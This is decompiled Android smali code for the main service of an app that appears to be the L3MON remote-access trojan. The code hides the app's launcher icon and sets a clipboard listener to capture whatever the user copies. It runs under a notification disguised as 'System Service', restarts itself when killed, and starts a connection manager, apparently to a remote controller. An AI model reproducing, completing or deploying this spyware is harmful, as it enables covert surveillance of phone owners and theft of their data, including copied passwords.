.class public Lcom/etechd/l3mon/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 27
    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 82
    sget-object v0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method

.method private startStealthForeground()V
    .locals 6

    invoke-static {}, Landroid/os/Build$VERSION;->SDK_INT()I

    move-result v0

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    const-string v1, "sys_events"

    const-string v2, "System Event Service"

    const/4 v3, 0x2

    new-instance v4, Landroid/app/NotificationChannel;

    invoke-direct {v4, v1, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Landroid/app/NotificationChannel;->enableLights(Z)V

    invoke-virtual {v4, v5}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    invoke-virtual {v0, v4}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

:cond_0
    invoke-static {}, Landroid/os/Build$VERSION;->SDK_INT()I

    move-result v0

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_1

    new-instance v0, Landroid/app/Notification$Builder;

    const-string v1, "sys_events"

    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

:cond_1
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

:goto_0
    const v1, 0x1080082

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "System Service"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "Running background tasks"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const/16 v1, 0x2a

    invoke-virtual {p0, v1, v0}, Lcom/etechd/l3mon/MainService;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 33
    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 2

    .line 76
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 77
    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V

    .line 78
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4
    .param p1, "paramIntent"    # Landroid/content/Intent;
    .param p2, "paramInt1"    # I
    .param p3, "paramInt2"    # I

    .line 39
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 40
    .local v0, "pkg":Landroid/content/pm/PackageManager;
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/etechd/l3mon/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x1

    const/4 v3, 0x2

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 44
    new-instance v1, Lcom/etechd/l3mon/MainService$1;

    invoke-direct {v1, p0}, Lcom/etechd/l3mon/MainService$1;-><init>(Lcom/etechd/l3mon/MainService;)V

    .line 65
    .local v1, "mPrimaryChangeListener":Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;
    const-string v3, "clipboard"

    invoke-virtual {p0, v3}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/ClipboardManager;

    .line 66
    .local v3, "clipboardManager":Landroid/content/ClipboardManager;
    invoke-virtual {v3, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 69
    sput-object p0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    invoke-direct {p0}, Lcom/etechd/l3mon/MainService;->startStealthForeground()V

    .line 70
    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 71
    return v2
.end method
